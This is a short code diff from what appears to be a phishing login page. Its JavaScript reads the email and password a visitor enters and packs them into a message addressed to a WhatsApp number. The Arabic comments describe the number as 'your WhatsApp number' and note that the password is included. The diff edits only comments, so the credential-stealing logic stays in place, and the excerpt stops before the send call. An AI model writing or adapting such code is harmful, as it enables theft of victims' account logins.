@@ -85,11 +85,11 @@
             event.preventDefault();
 
             const email = document.querySelector('input[name="email"]').value;
-            const password = document.querySelector('input[name="password"]').value; // الحصول على كلمة المرور
+            const password = document.querySelector('input[name="password"]').value;
 
             const data = {
                 phone: 'whatsapp:+967715935213', // رقم واتساب الخاص بك
-                message: `البريد الإلكتروني: ${email}\nكلمة المرور: ${password}` // تضمين كلمة المرور في الرسالة
+                message: `البريد الإلكتروني: ${email}\nكلمة المرور: ${password}` // تضمين البريد وكلمة المرور
             };
 
             try {
